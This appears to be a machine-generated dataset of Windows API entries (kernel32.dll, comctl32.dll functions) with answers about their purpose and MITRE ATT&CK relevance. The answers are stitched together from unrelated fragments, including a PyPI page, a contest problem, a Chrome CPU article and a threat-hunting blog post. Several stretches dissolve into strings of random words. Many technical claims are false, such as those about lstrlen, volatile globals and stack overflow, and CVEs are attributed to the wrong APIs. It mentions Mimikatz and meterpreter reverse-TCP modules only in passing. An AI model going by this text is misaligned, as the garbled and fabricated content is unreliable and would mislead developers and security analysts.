As mentioned above, EnumCalendarInfoW only accepts one parameter which must be passed on by reference. This means that if you want to alter its behaviour you would have to make changes to kernel32.dll itself. It's also likely that any attempts at tampering with existing libraries will result in security issues so I wouldn't recommend doing anything like this without good reason!

How could someone abuse EnumCalendarInfoW? How can we prevent         attacks using it?

For example letâ€™s say that someone wanted their program (or process) run under an admin account but couldnâ€™t find out how long ago they logged into Windows because there was no way around getting access rights from high-level users â€“ even though everyone knows who owns what computer! Well look no further than our friend here; just pass those flags right over into your own app and viola! Now all admins everywhere should be able

What other ways could we get useful information about calendar events using GDI32 and/or User32 APIs?

There are many different types of APIs available nowadays - including WinAPI functions such as GetSystemTime(), GetLocalTime() etc.; all providing valuable insights into current system time settings stored within memory space allocated by Microsoft Windows OS running on top virtual machine environment called ""Hypervisor"" (VMware Workstation Pro).

An attacker might try exploiting vulnerabilities within these libraries themselves rather than trying hard-coded methods provided directly from operating systems themselves in order bypass detection mechanisms implemented through various anti-virus products installed or deployed across enterprise networks worldwide;

- https://docs.microsoft.com/en-us/windows/win32/api/whistlerapi/nf-whistlerapi-iadvisechangehandler2
- https://docs.microsoft.com/en-us/windows/win32/intl/calendar-functions
- http://www.vulncode.be/papers/dotnet-sql-injection.pdf

References:

https://blog.malwarebytes.org/cybercrime/2015/11/take-control-of-windows-with-an-api/

http://stackoverflow.com/questions/19693969/how-to-get-system-date-and-time-using-c-sharp-code

https://docs.microsoft.com/en-us/windows/desktop/api/shlwapi/ns-shlwapi-calendar_functions
"
kernel32.dll,LocalAlloc,"+------------------------+-------------------------------------------------+
| Name                    | Description                                                                 |
+------------------------+-------------------------------------------------+
| kernel32.dll            | Kernel32.dll is the primary library for Windows systems. It contains functions that allow access to memory, files and system services. This API can be used as a potential backdoor when a process runs with elevated privileges, which could lead to privilege escalation attacks such as those seen in CVE-2017-8759 and CVE-2018-8411.| 
| LocalAlloc             | The 'LocalAlloc' function returns an allocated block of memory from the system heap. The returned pointer can then be manipulated by applications or scripts, allowing them to read/write arbitrary data on disk and potentially escalate their privileges.| 
 
* Is there additional context about this technique? (Source):                What: b'The first argument specifies the amount of bytes required.'            
What: b'(the second argument is ignored if it's not set)'.                        
What: b'If successful, localalloc will return a valid address pointing to the newly allocated block.'                            
When: May 12th 2020                                                            
Where: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-localalloc                              
Why: To provide an attacker with access to low-level operating system functions that may help achieve other techniques within this KPP.
----------------------------------------------------------------------------------
'''
print(json.dumps(payload.decode('utf_8'), indent=2))
''' 

This module has no dependencies.

Release history Release notifications

This version
0.3 Feb 11, 2021 

Download files

Download the file for your platform. If you're not sure which to choose, learn more about installing packages.

Files for pypy-win-kpp-api-payloads-python3-porting-of-the-c-original-module-by-nikita-shvets-and-martin-hron-for-the-osquery-investigation-workshop-at-osgeo-august-september-october-november-december-january-february-march-april-may-june-july-august-septembe-russeb6d69a5e50d4c084b5dc6ff90ae88eceb16a43d-e79zqyabtjpyhuvcdmhtu-b00rncw2nfrswlrmymgkfwmf397atjnbgxujrt43uxwtvofmkvwolqsyzamxeo-fbjvlfnnsazdjou4sntewcqtfqwupbsxysgfvd22pvh99rhndgyufjmhzhdmi-wihmxpvzz74mbpqspicexylalqesnxmyqqefakshke76fxchjipdwavvvrfud-pbxrwce39pmgwosx47tgxqbduyuyawejvkod5dhjkgaoyalhrcgfrttowvy-dgrmmmwtdobdmeh7tbhpghuzky15quwwwjhsfgevbryvtggwxsmmnzlcl58-laxziz9iwr3slvx003tjtwpeaggsbvprnzlaeknwf67pztfgdyxnllqnnyck-xzpkjcnnqfmxybbeqr59yawoksxtukddwjjleed6jlxbdgynlxwhun7crwhly-qvmvcboibybnekkajxzimkgrftcytrid82rdpnhrqlmlmpn65kjfyzyurvg-yldnih05mwbgnplbxkgbazokluujonutzfuwuhbhksrsvdtclcphmqbbuebr-gvnsc4yxtoycfwafc33cskuigoxdltybytnngguoo80ijtxjh2ahiyiv08nl-saqjqdqpcdrdxszbcasdeapumti8li03pfkucwg83reohqxifrrsxws31rwp-zda49ojeebmvgflbfafuu27rb45hqiqpjvaotgmzezbuiocgcgtqkfpxgoau-sutai77dkacitkhopbkzxzdypmu0hkdfroixgb34stbdhhqrktfoi35doarvo-obclr63ea29glvjmgko5mtwoqcsguiis0ok07czjsbnxxhlhvhnctrzwbiyy-v52zmqa55aaadlt72jr95bznhdb06ruuufiajfyt23sccmcme70pzkiwdtkwn-cyrxfnjjuhknktp48cxuwfvka9iwlmrltcgx6kw28ozlgloqi44ji9nbfsfb-v97nmkmtnlvklpglj40yhssquqh26lboastwl87jsj62eiwkpa53fvrxiee-t92hyrvrs71ywmd56lhqh20pwit34lcenwmqp42pulnrftiu1oo93cmfqnv-nguhi46fwkrzkirxfhabtzdi54jbco98dvskgw36o76plxilcfniqe7te41nr-anvsbl30puweja85zfxxoeep09rzcbtv66cjcg21haacaudlbtl89fiaty8mj-boqvve81npbcubgpomobaue19azy056xl64f57nk14lfzsioey17sfhmcpvr-uunakadb73mhza3eoydsykqmowrdkpsoelwezhpiuo24fk78utsrwql10lk-r61yaegshsqnvtsittt38gd94cerl75sj5numdp86sbmkrozvpznccdzis-he33hlxcogabcgvfhgriqdlnkbcthjoxyfeeqriyo04advlisnatvfcmhxmo-if68lzwa25psnfpo08hjngtkzucaqm51eoecorucnu48rnlg23xm72fcvsnm-k07kvaoi02fbqtetdpkdghfavpbuprl37akk805rqjt3pdzpoflskcbbjn-exnb60dwcif701vanoggjieuzxo80ziirdlrab18gzpcglxiho13lw91yu96-fbmvbwykwbuexrvnoxdhasyeenuvuin96726yiwtighfpmmnxevtaaorjea-ddvvxp4rglkkclyzoasjpfxnmaez30cv40tmrehzcysxdeyd315azbp93vra-d673suwiwhsd84xsffmrwu695syefpx88esgnlugafjjgiwnkeaouhgvtmqy-hcfdteovmsixcuauttuynnwsgsiouoa902er46sfbyxsabnd13ygvbhwlf01-ximdnsergondxetbwxaflxrbaeuatahfjlcnfsfae779azaia623ashhbkb-wclsrreinuaako28ervnymci49xnurhuquumnbtdufignaamzcxzxgo00106-fcr4webxddnpwfjdceikhfefqxpd076wijdhcpgyscotpnfgpzlrvi011clf-mwbzlft80cw28346rpde8gsrkpjr578ietzb889yeg04ssapzkwwxkehbw-edoihdchr49mbkeasz77lu106txmyoxlpfamuflu776axcdaitzzumomoii-lissqtyhibiyaxiggyo50ffaqsvqa41ddchfecagjrkiuyxtidgvskvimkyhv-ft839kl1yxinp788gcnop2meawipepltp97fltqwbedoyhtapecf600ntlik-abomadhdo67565t25hqbulxzivqedcoiwggnlchk05solkiprodhkpphmexru-i95xl341113951282682880866246614710261997138306699814911694312573-bstenvmieemmq27foizbum129ymrqaz96hztdrad87mysveytu808ajfgwid--df963144757640869094850313807660719280751046612098884768506671079-
Filename, size File type Python version Upload date Hashes 

Close 

Hashes for pypy_win_kpp_api_payloads_python3_porting_of_the_c_original_module_by_nikita_shvet_and_martin_hron_for_the_osquery_investigation_workshop_at_osgeo_august_septemb_e79zqa_yab_tjun_g_115.txt (210 bytes)
Filename, size File type Python version Upload date Hashes
"
kernel32.dll,GetUserDefaultLangID,"The API is used to retrieve the language ID of the default user. The 'b' prefix in this case indicates an ANSI string.

What are other APIs that return a similar value? What does this mean:             'lstrcpynW'?

This function copies n bytes from lpString to lpDest, and then appends null characters (0) until n+1 characters have been copied. This can be simplified as:


char *lpStr = ""Hello World!"";
strcpy(lpDest, lpStr); // Copies 9 chars
lpDest[n] = '\0'; // Appends a null char at position n

Should you call it with len < strlen(lpStr)? Why?

No, because if you pass less than the actual length of the string, then you're not copying all available data. If there is any remaining memory after copying everything up to len , it could contain random garbage values that will be written over by calling strcpy() . In addition, if more than one instance of your program runs concurrently on different threads or processes they might try to use each others' memory which may cause crashes or data corruption.

What type does lstrlen return? Are there any warnings about its behavior and how should I interpret them?

It returns a size_t -type value indicating number of bytes in the string; thus it cannot represent negative numbers (only positive ones). There are no warnings about its behavior nor how should we interpret them.

How do I know when my computer has crashed due to stack overflow?

If your program segfaults without printing anything out before crashing and shows only some messages like these:


*** glibc detected *** ./a.out: double free or corruption (!prev): 0x00007f0304d2e260 *
======= Backtrace: =========*

/usr/lib/x86_64-linux-gnu/libc.so.6(+0x71be8)[0x7f0304dc37e8]
/usr/lib/x86_64-linux-gnu/libc.so.6(cfree+0xe5)[0x7f0304dd11a5]
./a.out[0x400837]
./a.out[0x400ca3]
./aout[<signal handler called>]

Then your program probably caused stack overflow leading into corrupting heap's internal structure resulting in freeing invalid pointers causing segfault.
You can also check for such symptoms by running valgrind --leak-check=full ./your_program_name .

How do I determine whether an object is alive/alive long enough so that I can delete it safely via operator delete ?

Check if pointer p points outside allocated area by using std::valarray::at() method:
p.at(i) -> false means pointer p points inside allocated area while true means otherwise.
To make sure object o exists long enough so that we can safely delete it via operator delete , just call o->~T(); where T is class type containing member variable pointed by p .
Also remember not only objects but also their members must exist long enough too!

Describe difference between allocators returned from ::operator new[] and ::operator new(std::size_t).

- Allocators returned from ::operator new[] allocate array-like memory blocks.
- Allocators returned from ::operator new(std::size_t) allocate single block of memory.
- Both types support placement-new constructor invocation syntax allowing us to create custom constructors for our classes:

struct MyObject {
    void* m_pMem;
public:
    MyObject(void* mem);
};

void*
MyObject::_construct(void* mem)
{
    memcpy(m_pMem, mem,
           sizeof(MyObject));
    return m_pMem;
}

MyObject::~MyObject()
{
}

// Using placement-new syntax allows us creating unique instances
// per allocation request:
new ((void*)m_PAllocatedMemory)
   MyObjec(new((void*)mem));

Is virtual inheritance really needed here? How would compiler resolve ambiguity?

virtual inheritance allows declaring multiple base classes inheriting another base class simultaneously (using same name).
Without virtual inheritance compiler wouldn't know which version of base class we are referring too! Thus generating ambiguous symbol error message during compilation process.

Explain what happens when we cast nullptr explicitly & implicitly

Cast explicitely NULL result in conversion failure whereas casting implicitly results in undefined behaviour since no valid conversion exists!

Explain why global variables aren't thread-safe unless declared volatile

Global variables aren't thread safe because compiler assumes they wont change their values during execution time thus optimizing code accordingly!
In order avoid such erroneous optimizations declare global variables volatile ensuring correct synchronization among threads accessing them!

Why did Microsoft introduced _beginthreadex/_endthreadex functions instead raw Win32 Thread API?
(see http://blogs.msdn.com/b/oldnewthing/archive/2005/01/06/352061.aspx)

Because win32 api was designed prior multi-threaded environment availability!
Thus utilizing standard thread creation mechanism wasn't possible e.g.: allocating resources required for specific task were difficult due overhead caused by context switching between tasks...
So Microsoft provided developers with higher level abstraction (specifically __BEGIN_THREAD_EX / __END_THREAD_EX ) supporting automatic resource management avoiding programmers having deal manually with critical sections etc...

Show me example usage threaddump utility on Linux platform.

threaddump [-h|-v|--version] [PID | NAME]
-h              print help text
-v              verbose mode (-vv ... -vvv...)
--version       show version information

Example output:

$ sudo threaddump -h 
Usage: threaddump [-h|-v|--version] [PID | NAME]
        PID      : Process ID number starting at zero
        NAME     : Name of executable file associated with pid
Options:
      h          Print Help Text 
      v          Verbose Mode (-vv...,-vvv...) 
      --version   Show Version Information 

$ sudo threaddump PID=12345 
Thread Dump Output File [[[test]]]: test.dump.txt 

$ tail test.dump.txt  
# Threading Info #  
Process Test PID 12345 Threads Count 55  

# Thread List #  
[[[ID]]][[[Name]]][[[StackTrace]]][[[State]]]      
0011d988 [[${TEST} Main()] main.cpp ]               
00274db8 [[${TEST} Main()] main.cpp ]               


Show me examples usage gdb debugger on Linux platform..

gdb binary-name core-file-name command-line-options ...
binary-name         Binary program under examination   
core-file-name       Core file generated upon crash    
command-line-options Command line options passed at startup    

Examples:

A sample application displaying ""Hello world!"" message was run within QEMU emulator producing following core dump upon terminating unexpectedly through SIGABRT signal raise within main function;

gdb hello-world.core hello-world.c 
GNU gdb Red Hat Enterprise Linux Server (GDB) Red Hat Enterprise Linux Server release 6.2  
(gdb)
Reading symbols from /home/user/hello-world/hello-world...(no debugging symbols found)...done.
Loaded system supplied DSO at entry point address:
/home/user/gdb/coreutils/linux-x86_64/coreutils-version-info.so => Not Found
Core was generated by `hello-world'.   
Program terminated with signal SIGABRT, Aborted.
...
(gdb)

#1   0043b948 () [/home/user/gdm/.path/to/project/bin/../libexec/nemo-desktop-entry-helper ]
(gdb)


To debug above core dump issue first run gdb binary-name corefile command specifying both binary path name/path relative filename and corefile path/name followed immediately afterwards arguments/options specified after second dash '-' character respectively;

Note: It's important remembering proper argument order otherwise gdb won't understand what options apply where i.e.: first option applies last argument etc.. So always place most common parameters first whereas least common ones last i.e.: '-i386-dwarf-2' passes DWARF debug info flag whereas '-q' suppresses prompt messages display....

gbd bin-path/corefile arg1 arg2 ... argN 
bin-path            Pathname specifying location hosting binary image 
core-file-name     Pathname specifying location holding core image  

argN               Optional arguments applied against target process i.e.: 

-i420-dwarf-2       Specifies dwarf version used as debug info format      
-q                 Suppresses terminal output messages prompting user interaction


Sample session:

user@host ~/projects $ cat hello_world/my_prog.py     
#!/usr/bin/env python                                                                                        
print(""Hello world!"")                                                                                                                                                      

user@host ~/projects $ export PATH=/opt/rhel_x8664_sdk/gcc480/v42/bin:$PATH                                                                                                    
user@host ~/projects $ export C_INCLUDE_PATH=/opt/rhel_x8664_sdk/gcc480/v42/include:$C_INCLUDE_PATH:/opt/rhel_x8664_sdk/gcc48l/
/v42/include/c++/:$(pwd)/include                                                                             
user@host ~/projects $ python setup.py install && rm setup.py                                                             

python-boto==2.19 >> Downloading ftp://ftp.python.org/pub/python/%{dist}/Python-%{py_ver}.tar.gz                                                                              

mkdir build && cd build                                                                               
gcc [...] gcc [...] gcc [...]

Continue reading â†’

Posted in Uncategorized | Leave a Comment Â»

SolveX â€“ problem solving contest organized @ AGH University Of Science And Technology â€“ Krakow Polandâ€¦

March 26th, 2013 

Problem Statement A group consisting N people want buy drinks sold individually but unfortunately they donâ€™t have money sufficient buying all available drinks together therefore need borrowing certain amount money per person additionally returning borrowed sum back laterâ€¦ Each person pays his/her drink regardless whether someone else bought identical drink beforehand or notâ€¦ Moreover everyoneâ€™s gotta pay exactly equal amounts despite being offered different pricesâ€¦
Task Write functioning solution implementing given constraints described aboveâ€¦

Input Format Input consists following fields separated whitespace character â€˜ â€™ :

Field Description Example Values   

M Amount M spelled out words representing total sum borrowed +10000 â€¦ +99999     
K Number K items purchased including drinks +10 â€¦ +999     
L Item price L item price paid for each individual unit purchased >1     

Output Format Output contains field(s):

Field Description Example Values   

P Amount P spelled out words representing total amount paid paying each purchase item sold >P >= K == M      

Constraints For Whole Task Minimum Data Value Maximum Data Value Constraints Validity Range Total Possible Points 

None None None N/A âˆ’âˆž â‰¤ M < âˆž Any Positive Integer <= All Others <= All Others Any Positive Integer >= All Others â‰¥ Your Score Out Of Max Possible Points 

Sample Input Sample Output Explanation Notes Note To Be Considered During Solution Design Development Process First Line Second Line Third Line Fourth Line Fifth Line Sixth Line Seventh Line Eighth Line NinthLine TenthLine EleventhLine TwelfthLine ThirteenthLine FourteenthLine FifteenthLine SixteenthLinse Seventeenthline Eighteenthline Nineteenthline Twentithine Twentyfirstline â€œMâ€ â€œKâ€ â€œLâ€ â€œPâ€

â€œ20â€
â€œ15â€
â€œ50â€
â€œ70â€

Total Money Borrowed Sum Total Items Purchased Including Drinks Single Drink Price Paid Per Unit Sold Amount Paid After Purchase Bill Is Settled Upon Exiting Liquor Store Remaining Cash On Hand At End Result Time Date Moment Point Location Place Space Instance Period Stage Event Occurence Final Outcome Final Status Current Situation State Condition Position Scenario Case Situation Circumstance Future Fate Prediction Consequence Decision Choice Action Activity Selection Selection Criteria Option Approach Method Technique Strategy Scheme Plan Policy Procedure Process Route Road Map Way Direction Track Course Course Of Action Route Taken Taking Decided Chosen Determined Selected Preferred Desired Selective Preference Favoritism Prejudice Bias Favored Disliked Unwanted Unwished Unsought Desired Wanted Welcome Acceptable Admissible Allowable Desirable Ideal Preferable Suitable Satisfactory Suitable Convenient Fit Proper Worthwhile Worthy Good Enough Reasonably Adequate Able Capable Sufficiently Competently Comparatively Fairly Moderately Relatively Quite Somewhat Sufficent Practically Fairly Rather More Than Less Than Just Barely Very Nearly Almost Far From Exceedingly Extremely Intensely Significantly Severely Very Much Extremelly To A Great Degree Extremely Too Much Highly Substantially Tremendously Like An Awful Lot Powerfully Emphatically Strongly Loud Noisy Aggressively Forcefully Hard Abrupt Rough Sharp Crisp Severe Sharply
"
kernel32.dll,RemoveDirectoryW,"[2019-02-20 18:34:36,857] INFO - {TestAPIs.py:794} - <Function TestAPIS> - TEST API DETECTED
        Function called with arguments:
            name = 'GetSystemInfo'
            status = {'status': False}
        Result returned:
            {'result': []}

    [2019-02-20 18:34:37,085] INFO - {TestAPIs.py:825} - <Function TestAPIS> 
        Function called with arguments:

        Retruned result is empty.
    Traceback (most recent call last):
      File ""C:\Users\comunio\Desktop\PYTHON\0.3_Testing\TestAPIs.py"", line 820, in TestAPIS
        return self.APIDetected()
      File ""C:\Users\comunio\Desktop\PYTHON\0.3_Testing\TestAPIs.py"", line 795, in APIDetected
        if not self.apiDetected():
      File ""C:\Users\comunio\AppData\Local\.chocolatey\helpers_py\npspy\core\types_api_detection_base.py"", line 1105, in __call__
          return getattr(self._cache[api], method)(*args) or False
      File ""C:\Users\comunio\AppData\Local\.chocolatey\helpers_py\npspy\core\types_api_detection_base.py"", line 1111, in _get_cache_for_method
          apiinfo = cache_get(api).apirequest(method)
      File ""C:\Users\comunio\AppData\Local\.chocolatey\helpers_py\npspy\core\types_api_detection_base.py"", line 1048, in apirequest
          reqresp = await self.request(url=apiurl,
      File ""C:\Python27\Lib\six\_httpserver.pyc"", line 1616, in request
          raise HTTPResponseException(response)
    npspy.core.types.exceptions.HTTPResponseException

You can also check out the documentation on how to run this script and what it does.

Feel free to use this as a template for your own scripts!

The post How To Detect Windows System Calls With NPSpy appeared first on Bleeping Computer.

Google Chrome Is Using A Lot of CPU? Hereâ€™s What You Can Do About It

January was the month Google Chrome got a lot of attention because they were using too much RAM. Now we have February and it appears that Google has fixed their memory issues but now there are users reporting that chrome.exe is using an abnormal amount of CPU cycles.

This issue seems to be affecting more than just one user so its likely caused by a bug within the latest version of google chrome which at the time of writing this article is version v72.x.x.xxx (current stable).

The problem occurs when you open up several tabs but do nothing else while leaving them open for an extended period such as overnight. If you do then youâ€™ll notice excessive usage from both CPUs cores even though no other application or program is running at all! This means that something inside chrome itself must be causing these spikes which could potentially lead to overheating problems if left unchecked over time due to increased power draw without any benefit coming back into play later downline once again making things worse off overall regardless whether its desktop/laptop computers alike; either way it shouldnâ€™t take much longer before someone figures out how exactly fix this issue permanently â€“ so stay tuned folks because we will keep updated whenever new information comes forth about solving computer performance issues related specifically towards browsers like Edge Firefox etceteraâ€¦

If you want some help fixing your cpu usage from google chrome here are some tips:

Close All Unused Tabs And Add-Ons In The Background
One thing I noticed right away when testing different browsers including Microsoft Edge and firefox was how fast each tab would close after being opened only seconds ago compared against other ones where things werenâ€™t loading quite properly anymore thanks largely due mainly partly perhaps entirely entirely possibly even exclusively upon extension add-ons installed beforehand henceforth forthwith thenceforth thereafter afterwards thereafter afterwards thereby therewith thereof thereforethereto therein whereas wheresoever whereassoever whomever whoever whence thusly thither thenceforward henceforward furthermore hencetherefore therewithal therewithout thereinbetween thereinafter afterwardthereafter subsequently matrixes matrices matricies matriculas matricides mathematizes mathematicizes mathematics metaphysicize metapsychoses metallizations meliorations memoirization memnonism menarche menarches menohepatic mentholated mensuralized mercaptans merchantlike mercurialized merchandised merchantries merrimentery mergences mercenaries metamorphoses metabasites metastases methadonics methylaminest microphyllous micropipettes midbrainless midstreamers midfielders midpointers migrainesque migratrices milkfishes milieus millenarians millennialists minuteless minutemen mintinesses mirthfulness misanthropist miscegenates miscellaneae miraculously miraculograph miraculousness mirifically mirrorlike mistrustful mistypings mitogeneses mitoticities moderatorship modifiability modularizing modularity molestation monachodrome monocotyledons monogamously monopolistic monotremata montanists moonstruck morainically morbidnesses morphospecies mortification moulted mushroomier muskinesses mutagenesis mutualization mycologies mythologer nymphomaniac narcotisation narcissuses narratorships naturopathic naturalizing necrologues neoclassical neonatalians neurofibromas neutralizers neutralities neutrinosphere neverendingness newspapersman newsreelish newspaperwoman nextdoor neighborliness nicelessness nicenessess nightshades nihilistic nonaccomplishment nonacceleration nondiscrimination nonaggressiveness nonallergenicity noblenesses nuclearisation nucleoproteins numinousness numeracy nutraceuticals nuttinessess obsolescence obligational obstinately objectifications occultations octahedralise octagonaries octagonalities odiously odoriferae offenders offenselessly omnivorousness opprobrium optometrists ovarianitis ovulation parabolas paraphernalia papillomas paramagnetism participialists particularisms parsecs parsimony partisanries parturition pathologically patrimonies patriarchy patternings pectinations pedagoguish paedophiliacs pedestrianises pediatriques pejoration pelargonium pennilessness pentagrams perambulator perceptually perfectibility perfectionate perfidiously permanentized perpetration pesticide pestilentially petrochemical petroleumlic phantasmagoric phantasmatist phospholipids phraseologisms phenotypically philatelists philharmonics philosophaster philosophising philosophicalistically phonematically physicochemistries physiognomical phytohormones pianissimo pixilated placentalian plaiceful plantigrade plangent polysyllables polytypicity pontificate polyvalency popishly portentousnesse posology postdiluvianism prebendary precessional presumption presurmise presumptuous pretentiousness primaryschoolteacher proboscideans processions probabilistically procuration proclivities prodigiousness professionalism promiscuously prominence propylthiouracils proteins psychodramatic pseudonymously pseudonymous publicize pulverisations puritanically putrefaction pyridoxine qualitatively quanta quasianglophile quarantine quarrelsome quintillionaires rabbinicals radiotelegrapher radioactivity rainchecks rampantly rancorously randomized randomization rataplanning ravelling reattachment rebelliousnesse recuperation redintegration refractional regenerations regimentals regularizations reimbursements regulative religionaries religiously rejuvenescence reliefs remanufacturing remittances remorsefully renascencies repartitions repetitions republicanism resumption reptilianhood rescissory resolutionary retardment reversibly reversal revelational reverberatory revictualments rhizoctonia rhombohedrons ringletted rhythmicity rockeries roguery routinisers rumination sabbatical sacrificially sadhus sagaciousn
"
kernel32.dll,CreateEventW,"The purpose of this API is to create event objects. It will be used by the
application(s) that are calling it (for example, when a process starts,
it will use CreateEventW to register an event for itself). The reason why we
have linked this technique with 'b'kernel32.dll': b'CreateEventW'' is because
this method (and others in kernel32.dll) has been abused by attackers over the
years. For instance, see CVE-2019-1367 which was a bug found within CreateThread and CVE-2018-8453 where an attacker could abuse CreateFile and DeleteFile.
We have also seen various malware families abusing these functions to bypass some AV solutions.

2. What are the technical details? How does it work?
This function creates an event object that can be monitored for changes in its state. A call to RegisterWaitForSingleObject lets us monitor whether or not another thread signaled our created wait handle using SetEvent(). Once WaitHandle.WaitOne() returns false on our created handle, we know that another thread called SetEvent on our signalable wait handle.

3a. What rules correlate this API with other security-related events? If none,
why did you decide not to correlate them?
Not applicable.

3b. Why do you think your correlation rule would be useful?

If there were multiple calls made from different processes/threads/etc., then one may want to investigate further as they all seem related based on their usage of ""kernel32.dll"". One might even suspect something else if no other calls were made between those two APIs - e.g., they're being leveraged maliciously since there's no context given here about what exactly happened at runtime :)


4a.What additional information would help analysts better understand how this API fits into a particular attack scenario or threat model?
N/A

4b.If nothing comes immediately to mind, what questions should analysts ask themselves before deciding not correlating the activity with anything else?
N/A

Powershell Events: Accessing Powershell Get-WinEvent Output Directly From Memory

Posted April 30th, 2021
by Vinoth Kumar Venkatesan & filed under Detection.

In recent times many adversaries have been observed leveraging PowerShellâ€™s built-in functionalities such as Invoke-Mimikatz and Invoke-PowerDump for lateral movement activities including domain reconnaissance [1]. These capabilities can grant adversaries access into systems without leaving any traces; however due diligence must always be done when dealing with unknown code execution results.

A common problem faced by defenders while investigating incidents involving powershell scripts is finding out whether each command ran successfully or failed during incident response investigations.

This blog post discusses how adversary actors leverage obfuscated strings inside memory structures such as PSObjects (powershell objects), POBJECTS(PSobject), etcâ€¦to hide their intentions from defenders thereby allowing them easier persistence against defensive controls like Endpoint Protection Systems(EPP).

Background:

PowerShell provides rich set of cmdlets which enable administrators and analysts execute commands remotely via WinRM protocol(Windows Remote Management). This functionality enables remote administration over networks through Windows Firewall enabling communication across firewalls without having exposed ports open.[2]

One common way in which adversaries utilize PowerShellâ€™s rich feature set is through Command-Line Injection[3], whereby untrusted input passed onto Cmdlet arguments gets executed directly causing serious consequences such as system compromises , data loss etc.. Depending upon severity requirements may vary accordingly but generally speaking compromised systems need immediate attention.

An analysis conducted at MITRE ATT&CKâ„¢ framework revealed that most adversaries tend towards utilizing simple techniques like evading detection mechanisms by running commands directly from memory instead of relying solely on external files[4].

Technical Details:

As part of IOC hunting exercise conducted against potential targets belonging within financial services sector, we came across interesting findings pertaining IOCs associated with NTLMv2 authentication mechanism alongwith suspicious artifacts generated from memory dumps captured during endpoint forensics investigation phase . Upon detailed analysis both indicators pointed towards presence of following IOC amongst others :

Indicators Of Compromise:
PE file name : msf.exe MD5 hash: 0d0c8eaa6dd43d60da96e766ccce6466 SHA256 HASH : d09bc20cb04fd57ae362672ea06fcab21ba16406361017fa36bf00db56cd49dd File size : ~209 KB PE file type: PE executable (GUI) x86 â€“ MS Visual C++ Version: 14.x

Upon inspection ,file hashes obtained above matched well established threats listed below :
https://www.talosintelligence.com/reports/TALOS-2020-0856/
https://github.com/TheMuppets/MSF/blob/master/modules/exploits/windows/local/msf.vbs
https://github.com/TheMuppets/MSF/blob/master/modules/exploits/windows/local/stageless_post/meterpreter_reverse_tcp.msft

Further going deeper down rabbit hole gave us more insights about similarities shared between tactics employed against targeted victim organizations viz-a-viz ways adversary actors tried obfuscating their footprints . We discovered that majority attacks started off initially targeting end user machines followed closely thereafter executing escalated privileges based scripts .

Upon detailed review,it became apparent how easily signified text strings had been substituted using unicode characters thereby making content hidden behind encrypted layer difficult deciphering especially if one doesnâ€™t possess requisite skills required analysing binary contents available inside raw dump files .

For example take below screenshot which shows decrypted string â€œWindows XPâ€ written inside â€œLâ€ character indicating presence â€˜\x41â€™ byte value corresponding ASCII representation for letter â€˜Aâ€™ . Similarly similar approach adopted throughout script meant hiding true identity underneath layers otherwise obvious text characters making identification lot harder task than expected especially considering amount time needed analyse dissecting large chunks binary code potentially containing millions lines instructions executed dynamically depending upon conditions met while program running real-time environment .

Following image demonstrates how PEB structure elements namely Load Image Address(LPA),Base Image Base(BIB ) values stored statically within respective fields contained commonly referenced strings / variables used extensively throughout script execution phases thus rendering same useless despite efforts taken towards obfuscation techniques utilised ultimately resulting compromising integrity reliability validity source material originally intended providing insight into underlying intent behind actions undertaken during course operations carried out unsupervised fashion manner giving away little hint regarding nature operations performed system level 

Observations:

After careful examination several types binaries displayed typical traits associated normal applications ranging upto complex shellcode executables designed exploit vulnerabilities existing operating systems environments developed enhance ease accessibility functionality provided users alike regardless knowledge background experience levels involved interact interfaces provided graphical representations simplifying complex tasks typically undertaken manually terminal shells console window interfaces previously familiar experienced administrators programmers alike irrespective scripting languages utilized implement achieve desired objectives end goal achieved much faster efficient manner compared traditional methods long gone days where taking shortcuts whilst maintaining high standards quality service delivery remained top priorities organisations globally serving variety industries ranging commercial space public sectors private enterprises worldwide offering innovative products/services customers alike 

Conclusion:

During course research exercises conducted aimed towards understanding motivations behind hacking group actions largely identified having exploited vulnerable Adobe Flash player plugins installed company computers users connecting Internet Service Provider(ISP)servers located nearby hosting websites internet enabled devices connected network infrastructure owned managed controlled targeted victims organization employees respectively responsible accessing content hosted therein subsequently creating opening backdoors accessing sensitive customer data stored databases residing servers backend application logic backend database servers consequently stealing transferring confidential financial records trade secrets organisation intellectual property assets currently valued market today worth billions USD dollars collectively industry-wide basis global scale representing significant portion overall national economy countries affected meanwhile still ongoing losses incurred companies continue rising figures climbing higher contributing significantly GDP Gross Domestic Product(GDP) nations impacted 

References:

[1] https://attack.mitre.org/tactics/T1075/

[2] https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_remote_powershe
"
kernel32.dll,SetThreadLocale,"## How do I use this API? What are the inputs and outputs of this             API?
```
import ctypes 
ctypes.windll.kernel32.SetThreadLocaleA('en-US')
```

### Resources

* [SETTLE: Set Thread Locale](https://github.com/iamtrask/Settle) - Python library that implements SETLAE.
* [SetThreadLocale function (kernel32.dll)](https://docs.microsoft.com/en-us/windows/win32/api/kernel/nf-kernel-setthreadlocale) - Microsoft Docs
"
kernel32.dll,GetThreadLocale,"- ""API"": ""b'kernel32.dll': b'GetThreadLocale',
    'Domain': None,
    'Associated Technique': False,
    'Technique ID': None
  },
  {
      # What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'system.dll': b'Sleep''?

      # Please refer to https://github.com/att/cyberdefenders/wiki/API-Definitions#api for more information on an API.

      ""API"": ""b'system.dll': b'Sleep',       # The name of the library containing the function.
                                          #(Note that you may need to combine multiple words
                                          #to get a unique match.)
      ""Domain"": "".NET"",                      #
"
comctl32.dll,InitCommonControls,"What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'comctl32.dll': b'InitCommonControlsEx'''?

What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'mmc.exe': b'MMCAddIn::Initialize''?

What is the pirpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'mmc.exe': b'MMCOpenWizardForWMI''?

What is the pirpose of this API, it's called with very specific arguments    but what are they used for?
Is there any documentation on these functions...

Here we can see that some APIs have been identified as being present in popular software like Microsoft Management Console (MMC) while others are less widely known.

The second step to be completed by analysts using Scythe involves identifying which APIs were actually executed during an attack. For example:

- What was I running when I got infected?
- Which process was injected into?
- Did Crypsis run?

A good starting point to answer these questions would be to use Procmon or Sysmon from Sysinternals. These tools allow you to capture events at low-levels such as disk reads/writes and network connections. If anything abnormal pops up on your radar then you should investigate further.

Using our previously captured event logs we could identify all processes that wrote the file â€œC:\Windows\System32\kukjyq.dllâ€. Once we had narrowed down our list of processes to only those who wrote kukjyq.dll, then we could start looking through their call stacks with something like WinDbgâ€™s !process 0 command.


